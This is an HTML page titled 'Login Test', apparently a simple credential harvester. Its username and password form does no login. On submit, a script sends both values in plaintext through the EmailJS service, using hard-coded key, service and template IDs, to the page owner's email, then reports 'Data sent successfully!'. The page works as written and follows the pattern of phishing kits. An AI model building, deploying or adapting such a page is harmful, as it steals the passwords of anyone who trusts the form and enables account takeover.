<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login Test</title>

    <!-- EmailJS Library -->
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

    <script>
        (function(){
            emailjs.init("HroCugO_zwp5xHOFA"); // <-- ضع الـ Public Key هنا
        })();
    </script>

    <style>
        body {
            font-family: Arial;
            background: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        form {
            background: white;
            padding: 20px;
            border-radius: 8px;
            width: 250px;
        }
        input, button {
            width: 100%;
            margin: 8px 0;
            padding: 8px;
        }
    </style>
</head>
<body>

<form id="loginForm">
    <h3>Login Test</h3>
    <input type="text" id="username" placeholder="Username" required>
    <input type="password" id="password" placeholder="Password" required>
    <button type="submit">Login</button>
</form>

<script>
document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const params = {
        username: document.getElementById("username").value,
        password: document.getElementById("password").value
    };

    emailjs.send(
        "service_b9bxbmf",   // <-- Service ID
        "template_iy23fst",  // <-- Template ID
        params
    ).then(
        function() {
            alert("Data sent successfully!");
        },
        function(error) {
            alert("Error: " + error.text);
        }
    );
});
</script>

</body>
</html>
